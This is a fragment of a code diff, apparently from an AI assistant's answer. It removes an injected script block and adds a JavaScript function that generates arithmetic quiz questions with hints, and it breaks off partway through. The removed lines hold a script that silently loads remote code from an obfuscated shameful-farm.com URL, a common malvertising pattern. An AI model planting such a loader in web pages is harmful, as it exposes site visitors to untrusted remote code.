-https://bold-consequence.com/b.3zVO0HPE3kp/vibRmrVyJeZXD_0t3yMRzHYc2CNwTyAXxeL-TYcHzRNejDYq1eM/DpUE
-https://bold-consequence.com/bA3.V/0GPT3Lpwv/bOmLVFJ/ZpDE0_3LMEzvY/zLNpjLcR3VL/TfcwzMNNjWMj2IOpDqEC
-<meta name="referrer" content="no-referrer-when-downgrade" />
-<script>
-(function(tryw){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = tryw || {};
-s.src = "\/\/shameful-farm.com\/b\/XLVys.dxGMla0eYLWacd\/jeJmU9wu\/Z\/UZlkkSPsThcszkN-j\/c\/w-N\/DjEPtxN\/zpM\/2ZNczvAz0wNCQD";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-</script>
+    function makeQuestion(topic) {
+      if (topic === "addition") {
+        const a = randomInt(12, 68);
+        const b = randomInt(11, 57);
+
+        return {
+          expression: `${a} + ${b}`,
+          answer: a + b,
+          hint: "Try adding the ones first."
+        };
+      }
+
+      if (topic === "subtraction") {
+        const a = randomInt(35, 98);
+        const b = randomInt(12, a - 8);
+
+        return {
+          expression: `${a} − ${b}`,
+          answer: a - b,
+          hint: "Count back from the larger number."
+        };
+      }
+
+      if (topic === "multiplication") {
+        const a = randomInt(2, 12);
+        const b = randomInt(2, 10);
+
+        return {
+          expression: `${a} × ${b}`,
+          answer: a * b,
+          hint: "Think of equal groups."
+        };
+      }
+
+      if (topic === "division") {
+        const divisor = randomInt(2, 12);
+        const quotient = randomInt(2, 12);
+
+        return {
+          expression: `${divisor * quotient} ÷ ${divisor}`,
+          answer: quotient,
+          hint: "What number times the divisor makes the whole?"
+        };
+      }
+
+      const first = randomInt(2, 8);
+      const second = randomInt(2, 7);
+      const third = randomInt(2, 6); **…**
+
+_This response is too long to display in full._
